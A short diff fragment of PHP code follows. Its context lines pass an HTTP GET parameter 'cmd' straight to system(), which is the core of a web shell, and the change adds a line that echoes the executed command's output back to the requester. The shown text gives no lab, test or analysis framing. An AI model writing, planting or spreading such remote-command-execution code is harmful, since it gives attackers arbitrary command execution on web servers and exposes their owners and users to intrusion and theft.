@@ -11,6 +11,7 @@
         $comando = system($_GET['cmd']);
         while($comando){
             sleep(0.1);
+            echo $comando;
             flush();
         }
     }
